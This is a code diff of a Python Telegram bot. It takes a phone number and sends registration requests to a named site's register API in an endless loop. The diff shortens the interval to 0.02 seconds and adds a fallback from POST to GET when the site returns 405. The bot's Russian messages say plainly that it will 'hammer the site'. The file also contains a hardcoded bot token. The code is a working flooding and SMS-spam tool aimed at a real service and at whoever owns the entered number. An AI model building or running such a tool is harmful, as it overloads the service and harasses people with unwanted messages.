@@ -5,12 +5,12 @@ from telegram.ext import Application, CommandHandler, MessageHandler, filters, C
 
 BOT_TOKEN = "8830187981:AAGZu4sKhuTpTSI8sPgliF2lvXYJotP1k1s"
 
-REGISTER_URL = "https://cabinet.presscode.app/api/register"
+BASE_URL = "https://cabinet.presscode.app/api/register"
 
 spam_tasks = {}
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Отправь номер телефона (например, +380963836766) — начну бесконечно отправлять запросы на регистрацию.")
+    await update.message.reply_text("Отправь номер (например, +380963836766) — начну долбить сайт запросами.")
 
 async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
@@ -35,25 +35,32 @@ async def handle_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not phone.startswith('+'):
         await update.message.reply_text("Формат: +380...")
         return
-    await update.message.reply_text(f"Запущено. Начинаю долбить {REGISTER_URL} с номером {phone}")
+    await update.message.reply_text(f"Запущено на {phone}")
 
     async def spam():
         count = 0
+        method = 'POST'
         async with aiohttp.ClientSession() as session:
             while True:
                 try:
-                    payload = {'phone': phone}
-                    async with session.post(REGISTER_URL, data=payload, timeout=5) as resp:
-                        status = resp.status
-                        text = await resp.text()
-                        count += 1
-                        await context.bot.send_message(chat_id, f"Попытка #{count}: статус {status}, ответ: {text[:50]}")
-                        await asyncio.sleep(0.05)
+                    if method == 'POST':
+                        resp = await session.post(BASE_URL, data={'phone': phone}, timeout=5)
+                    else:
+                        resp = await session.get(BASE_URL, params={'phone': phone}, timeout=5)
+                    status = resp.status
+                    text = await resp.text()
+                    count += 1
+                    if status == 405 and method == 'POST':
+                        method = 'GET'
+                        await context.bot.send_message(chat_id, f"405, переключаю на GET")
+                    else:
+                        await context.bot.send_message(chat_id, f"Попытка #{count}: {status}, {text[:30]}")
+                    await asyncio.sleep(0.02)
                 except asyncio.CancelledError:
                     break
                 except Exception as e:
-                    await context.bot.send_message(chat_id, f"Ошибка: {str(e)[:40]}")
-                    await asyncio.sleep(0.05)
+                    await context.bot.send_message(chat_id, f"Ошибка: {str(e)[:30]}")
+                    await asyncio.sleep(0.02)
 
     task = asyncio.create_task(spam())
     spam_tasks[chat_id] = task
